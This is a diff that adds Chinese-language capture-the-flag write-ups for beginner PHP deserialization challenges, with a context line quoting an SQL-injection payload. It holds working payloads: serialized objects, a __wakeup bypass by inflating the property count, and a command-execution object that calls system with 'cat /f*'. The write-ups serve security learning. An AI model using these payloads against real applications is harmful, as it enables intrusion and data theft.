@@ -856,6 +856,88 @@ http://sqli-labs.bachang.org/Less-1/?id=-1' union select 1,2,group_concat(passwo
 
 
 ```
+## [SWPUCTF 2021 新生赛]ez_unserialize
+
+https://www.nssctf.cn/problem/426
+
+* 考点：反序列化
+* 工具：php
+
+通过题目的提示从 robots.txt 找到入口，查看 php 源码，发现是一个反序列化的题目
+
+![](./img/反序列化_原始代码.png)
+
+于是可以使用下面的代码构建对象并指定参数：
+
+```php
+<?php
+class wllm {
+    public $admin;
+    public $passwd;
+}
+
+$obj = new wllm();
+$obj->admin = "admin";
+$obj->passwd = "ctf";
+echo urlencode(serialize($obj));
+?>
+```
+---
+
+## [SWPUCTF 2021 新生赛]no_wakeup
+
+https://www.nssctf.cn/problem/429
+
+* 考点：反序列化,php,绕过__wakeup
+* 工具：php
+
+关于w__wakeup的绕过：
+
+先序列化字符串，然后**使序列化后字符串中属性的个数大于真实对象中属性的个数**，即可绕过__wakeup
+对于这道题：
+
+```php
+ public function __wakeup(){
+            $this->passwd = sha1($this->passwd);
+        }
+```
+
+所以，可以在前一题的 payload 的基础上进行修改，将对象的属性个数设置的大点
+
+```php
+O:6:"HaHaHa":2:{s:5:"admin";s:5:"admin";s:6:"passwd";s:4:"wllm";}
+O:6:"HaHaHa":3:{s:5:"admin";s:5:"admin";s:6:"passwd";s:4:"wllm";}
+```
+
+将2修改为3
+
+---
+
+## [SWPUCTF 2022 新生赛]1z_unserialize
+
+https://www.nssctf.cn/problem/2883
+
+* 考点：反序列化,PHP,RCE
+* 工具：hackbar，php
+  
+这道题和前面的略有不同，需要自己构建命令获取 flag ，可以看到 lly 成员变量在括号中，所以可以直接构建 system 命令去攻击
+
+```php
+class lyh{
+    public $url = 'NSSCTF.com';
+    public $lt;
+    public $lly;    
+}
+$a= new lyh();
+$a->lt="system";
+$a->lly="cat /f*";
+echo serialize($a);
+```
+其中有几点需要注意：
+- 创建新的对象的操作需要使用一个不和类名重名的名称
+- new 类名() 后要加()
+
+---
 
 
 
